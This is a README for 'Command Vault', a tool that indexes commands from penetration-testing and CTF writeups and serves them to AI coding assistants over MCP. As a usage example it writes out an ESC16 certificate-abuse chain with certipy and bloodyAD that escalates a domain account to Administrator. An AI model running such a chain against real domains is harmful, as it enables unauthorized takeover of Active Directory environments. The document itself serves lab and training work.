# Command Vault (also MCP)

> *"What was that certipy command I used last week for ESC8?"*
> *"How did I exploit that shadow credentials thing again?"*

Ever found yourself digging through shell history, old notes, or writeups trying to recall that exact command you used before? Shell history is basic and lacks context. This tool solves that.

Command Vault indexes commands from your penetration testing writeups into a searchable database with full context - what tool, what technique, which box. It's also MCP-ready, so your AI assistant can search your command history for you.

## Features

- **Full-text search** across commands and scripts from your writeups
- **Smart categorization** - 200+ security tools mapped to categories (recon, AD, web, privesc, etc.)
- **Template generation** - Auto-replaces IPs, domains with placeholders
- **Security filtering** - Flags and credentials automatically redacted
- **Multiple writeup types** - Supports boxes, challenges, and Sherlocks

## Requirements

- Python 3.11+
- [uv](https://docs.astral.sh/uv/) (recommended) or pip

## Installation

```bash
# Clone the repository
git clone https://github.com/x746b/command-vault.git
cd command-vault

# Install with uv (recommended)
uv pip install -e .

# Or with pip
pip install -e .
```

## Quick Start

1. **Set up your writeup directories** (environment variables or defaults):

```bash
export WRITEUPS_BOXES="$HOME/writeups/boxes"
export WRITEUPS_CHALLENGES="$HOME/writeups/challenges"
export WRITEUPS_SHERLOCKS="$HOME/writeups/sherlocks"
```

2. **Index your writeups**:

```bash
vault index --rebuild
```

3. **Search for commands**:

```bash
vault search "kerberoasting"
vault search --tool nmap --category recon
```

## Indexing Writeups

### Initial Index

Run a full index on first setup:

```bash
vault index --rebuild
```

### Adding New Writeups

After adding new writeup files:

```bash
vault index --add
```

### Index Specific Type

```bash
vault index --add --type box        # Only boxes
vault index --add --type challenge  # Only challenges
vault index --add --type sherlock   # Only sherlocks
```

### Index Custom Directories

```bash
vault index --add /path/to/writeups /another/path
```

## CLI Usage

```bash
# Search by keyword
vault search "kerberoasting"
vault search "shadow credentials"

# Search by tool
vault search --tool certipy
vault search --tool bloodyAD --limit 5

# Search by category
vault search --category ad
vault search --category privesc

# Filter by writeup type
vault search --type box "ADCS"
vault search --type challenge "SQLi"

# Combine filters
vault search --tool nmap --category recon --limit 10

# Search scripts
vault scripts --language python
vault scripts --library pwn

# List tools and categories
vault tools --category ad
vault categories

# Show statistics
vault stats

# JSON output (for scripting)
vault search "ESC16" --json
```

### Example Output

```
$ vault search "ESC16"

============================================================
Tool: certipy
Source: BoxName.md [PrivESC]
Purpose: Certipy v5.0.2 shows "ESC16 : Security Extension is disabled"...

  certipy find -u 'svc_user' -hashes ':a1b2c3...' -dc-ip 10.10.10.100 -stdout -vulnerable

  Template: certipy find -u 'svc_user' -hashes ':a1b2c3...' -dc-ip {IP} -stdout -vulnerable
```

```
$ vault stats

{
  "writeups": {
    "total": 150,
    "boxes": 80,
    "challenges": 50,
    "sherlocks": 20
  },
  "commands": {
    "total": 2500,
    "by_category": {
      "recon": 400,
      "ad": 350,
      "web": 300,
      ...
    }
  }
}
```

### Shell Alias

Add to your `~/.bashrc` or `~/.zshrc`:

```bash
alias vault="cd /opt/command-vault-mcp && uv run vault"
```

Then use directly:
```bash
vault search "certipy"
vault stats
```

## MCP Server Configuration

### CLI (Claude Code, Codex, Gemini)

```bash
claude mcp add command-vault \
  -e VAULT_DB=~/.local/share/command-vault/vault.db \
  -e WRITEUPS_BOXES=~/writeups/boxes \
  -e WRITEUPS_CHALLENGES=~/writeups/challenges \
  -e WRITEUPS_SHERLOCKS=~/writeups/sherlocks \
  -- /path/to/command-vault/.venv/bin/python -m command_vault.server
```

Replace `claude` with `codex` or `gemini` for other AI coding assistants.

### JSON Config

Add to `~/.claude.json` or `.mcp.json`:

```json
{
  "mcpServers": {
    "command-vault": {
      "command": "/path/to/command-vault/.venv/bin/python",
      "args": ["-m", "command_vault.server"],
      "env": {
        "VAULT_DB": "~/.local/share/command-vault/vault.db",
        "WRITEUPS_BOXES": "~/writeups/boxes",
        "WRITEUPS_CHALLENGES": "~/writeups/challenges",
        "WRITEUPS_SHERLOCKS": "~/writeups/sherlocks"
      }
    }
  }
}
```

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `VAULT_DB` | Path to SQLite database | `~/.local/share/command-vault/vault.db` |
| `WRITEUPS_BOXES` | Boxes writeups directory | None |
| `WRITEUPS_CHALLENGES` | Challenges writeups directory | None |
| `WRITEUPS_SHERLOCKS` | Sherlocks writeups directory | None |

## MCP Tools Reference

| Tool | Description |
|------|-------------|
| `search_commands` | Search commands by keyword, tool, or category |
| `search_scripts` | Search exploit scripts (Python, JS/Frida, PowerShell) |
| `get_tool_examples` | Get usage examples for a specific tool |
| `suggest_command` | Get command suggestions for a goal |
| `list_tools` | List indexed tools |
| `list_categories` | List categories with counts |
| `get_writeup_summary` | Get summary from a specific writeup |
| `index_writeups` | Index or re-index writeup directories |
| `vault_stats` | Get statistics about indexed content |

## Writeup Format

The parser expects markdown files with fenced code blocks. Commands are extracted based on shell prompts.

### Supported Prompts

| Prompt Style | Example | Extracted Command |
|--------------|---------|-------------------|
| Bash `$` | `$ nmap -sV 10.10.11.1` | `nmap -sV 10.10.11.1` |
| Zsh `➜` | `➜  hackthebox nmap -sV 10.10.11.1` | `nmap -sV 10.10.11.1` |
| Zsh + git | `➜  repo git:(main) python3 exploit.py` | `python3 exploit.py` |
| Virtualenv | `(venv) ➜  project python3 solve.py` | `python3 solve.py` |
| PowerShell | `PS C:\Users> Get-ADUser -Filter *` | `Get-ADUser -Filter *` |
| Evil-WinRM | `*Evil-WinRM* PS C:\> whoami` | `whoami` |
| PowerView | `PV > Get-DomainUser` | `Get-DomainUser` |
| CMD | `C:\Windows> whoami` | `whoami` |

### Example Writeup

~~~markdown
## Enumeration

```bash
$ nmap -sC -sV 10.10.11.100
```

```bash
➜  boxname nmap -p- --min-rate 10000 10.10.11.100
```

```powershell
*Evil-WinRM* PS C:\Users\admin> Get-ADUser -Filter *
```

```python
#!/usr/bin/env python3
from pwn import *
# exploit code - detected as script
```
~~~

### Output Filtering

The parser automatically skips common output patterns that aren't commands:
- Tool banners: `Impacket v`, `Certipy v`, `[*]`, `[+]`, `[-]`
- ACL output: `Owner:`, `Group:`, `Allow`, `Deny`
- Timestamps, separator lines (`---`, `===`)

### Writeup Types

- **Boxes**: Machine writeups (detected from `/boxes/` in path)
- **Challenges**: CTF challenges with type in filename, e.g., `Challenge (web).md`
- **Sherlocks**: DFIR investigations (detected from `/sherlocks/` in path)

## Example: Real-World Usage

> **You:** *"What was that certipy command I used for ESC16?"*

Command Vault searches your writeups and returns the full attack chain with context:

**1. Find vulnerable templates:**
```bash
certipy find -u 'user' -hashes ':hash' -dc-ip $IP -stdout -vulnerable
# Output: "ESC16 : Security Extension is disabled"
```

**2. Change target UPN to Administrator:**
```bash
bloodyAD --host dc.domain.local -d domain.local -u controlleduser \
  -p ':hash' set object targetuser userPrincipalName -v Administrator
```

**3. Request certificate with Administrator SID:**
```bash
certipy req -u 'targetuser@domain.local' -hashes ':hash' \
  -ca 'YOURCA' -template 'User' \
  -upn 'administrator@domain.local' -sid 'S-1-5-21-...-500'
```

**4. Authenticate with the certificate:**
```bash
certipy auth -pfx administrator.pfx -domain domain.local
```

All commands come with source context (which box, which section) so you can revisit the full writeup if needed.

## Troubleshooting

### "vault: command not found"

The CLI isn't in your PATH. Use one of these approaches:

```bash
# Option 1: Run via uv
cd /path/to/command-vault-mcp
uv run vault search "query"

# Option 2: Add to PATH after install
pip install -e .  # Creates vault in ~/.local/bin
export PATH="$HOME/.local/bin:$PATH"
```

### "No results found"

1. Check if writeups are indexed: `vault stats`
2. If counts are 0, run: `vault index --rebuild`
3. Verify writeup directories exist and contain `.md` files

### MCP server not connecting

1. Verify the `cwd` path in your MCP config points to the project directory
2. Check that `uv` is installed and in PATH
3. Test manually: `cd /path/to/command-vault-mcp && uv run command-vault`

### Database errors

Reset the database:

```bash
rm ~/.local/share/command-vault/vault.db
vault index --rebuild
```

### Commands not being extracted

The parser looks for code blocks with `bash`, `sh`, `powershell`, or `ps` language tags. Commands should start with `$`, `#`, or `PS>` prompts, or be standalone tool invocations.

## License

MIT License - see [LICENSE](LICENSE) file.
